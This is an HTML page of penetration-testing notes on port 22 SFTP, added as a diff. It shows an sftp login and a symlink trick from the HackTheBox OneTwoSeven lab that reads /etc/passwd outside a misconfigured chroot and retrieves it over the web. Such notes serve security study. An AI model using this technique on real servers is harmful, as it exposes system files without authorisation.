@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>22 - SFTP</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Port 22 - SFTP</h1></strong><br />SFTP stands for SSH File Transfer Protocol or Secure File Transfer Protocol.<br />It&#39;s basically an encrypted version of FTP.<br /><br />Log in<br /><code>sftp john@10.10.10.133</code><br /><br /><strong><h2>## symlink - Read files outside of directory</h2></strong><br /><strong>Examples</strong><br />• hackthebox OneTwoSeven<br /><br />You might be able to symlink to retrieve/read files outside of the ftp directory if chroot isn&#39;t set up properly.<br /><br />(chroot changes the “root” of the file system, e.g. to something like <code>/tmp/sftp</code>, so the user can&#39;t access files outside of <code>/tmp/sftp</code>)<br /><br />You have to symlink to a file that doesn&#39;t already exist.<br /><br />Symlink <code>/etc/passwd</code> to <code>sym1.txt</code><br /><div class="codebox"><div class="codebox">sftp&gt;&nbsp;symlink&nbsp;/etc/passwd&nbsp;sym1.txt<br />sftp&gt;&nbsp;ls&nbsp;-l<br />-rw-r--r--&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;1001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;349&nbsp;Feb&nbsp;15&nbsp;21:03&nbsp;index.html<br />lrwxrwxrwx&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;1001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11&nbsp;Jul&nbsp;&nbsp;3&nbsp;16:54&nbsp;sym1.txt</div></div><br /><br />And view the file here - <code>http://onetwoseven.htb/~ots-mM2Y3Y2U/sym1.txt</code><br /><a href=""><img src="images/92-1.png" alt="images/92-1.png" /></a></div>
+</body>
+</html>
